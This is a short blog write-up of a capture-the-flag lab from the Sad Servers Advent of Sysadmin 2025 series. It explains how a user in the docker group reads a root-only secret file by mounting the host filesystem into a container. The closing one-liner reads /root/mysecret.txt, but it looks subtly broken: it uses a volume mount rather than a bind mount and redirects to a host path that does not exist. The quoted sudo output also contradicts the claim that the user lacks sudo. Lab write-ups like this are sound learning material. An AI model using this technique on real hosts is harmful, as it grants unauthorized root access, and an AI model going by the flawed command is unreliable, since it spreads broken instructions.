---
title: Annapurna - Advent of Sysadmin 2025 - 12/07
tags: [devops, ctf]
date: 2025-12-07
---

> This is part of Sad Servers' [Advent of Sysadmin 2025](https://sadservers.com/advent) series.
>
> I'm doing each challenge every day and I'm publishing a quick write up for each one every day.
>
> 12-07: Docker attack surface
>
> Spoiler alert! This gives the solution to the challenge.
> If you want to do it on your own, stop reading.

---

**Scenario:** "Annapurna": High privileges

**Level:** Medium

**Type:** Hack

**Tags:** [hack](https://sadservers.com/tag/hack)   [advent2025](https://sadservers.com/tag/advent2025)

**Access:** Email

**Description:** You are logged in as the user _admin_.

You have been tasked with auditing the admin user privileges in this server; "admin" should not have sudo (root) access.

Exploit this server so you as the admin user can read the file _/root/mysecret.txt_  
Save the content of _/root/mysecret.txt_ to the file _/home/admin/mysolution.txt_ , for example: echo "secret" > ~/mysolution.txt

**Root (sudo) Access:** False

**Test:** Running md5sum /home/admin/mysolution.txt returns . (We also accept the md5sum of the same file without a newline at the end).

The "Check My Solution" button runs the script _/home/admin/agent/check.sh_, which you can see and execute.

**Time to Solve:** 20 minutes.

---

This is the second one in the `hack` category! I love those.

Alas, in this one, the user we get logged into doesn't have sudo access at all.

```bash
admin@i-0adfc7a1f5cd64cfb:~$ sudo -l
Matching Defaults entries for admin on i-0adfc7a1f5cd64cfb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User admin may run the following commands on i-0adfc7a1f5cd64cfb:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /sbin/shutdown

```

But the user has docker access!

```bash
$ id
<output not copied>
$ docker --version
<output not copied>
```

[Docker daemon attack surface | Docker Docs](https://docs.docker.com/engine/security/#docker-daemon-attack-surface)

Since the user is part of the `docker` group, we can run docker without sudo. And that allows us to mount any part of the host filesystem into the docker container and gain access to it.

> First of all, only trusted users should be allowed to control your Docker daemon. This is a direct consequence of some powerful Docker features. Specifically, Docker allows you to share a directory between the Docker host and a guest container; and it allows you to do so without limiting the access rights of the container. This means that you can start a container where the `/host` directory is the `/` directory on your host; and the container can alter your host filesystem without any restriction. This is similar to how virtualization systems allow filesystem resource sharing. Nothing prevents you from sharing your root filesystem (or even your root block device) with a virtual machine.

GTFOBins also mentions this: [docker | GTFOBins](https://gtfobins.github.io/gtfobins/docker/)

It is then simply a matter of running a container that will output the secret file to the required destination. A quick one-liner like this works:

```bash
docker run --mount type=volume,src=/,dst=/host alpine cat /host/root/mysecret.txt > /host/home/admin/mysolution.txt
```

And one more! 🚩
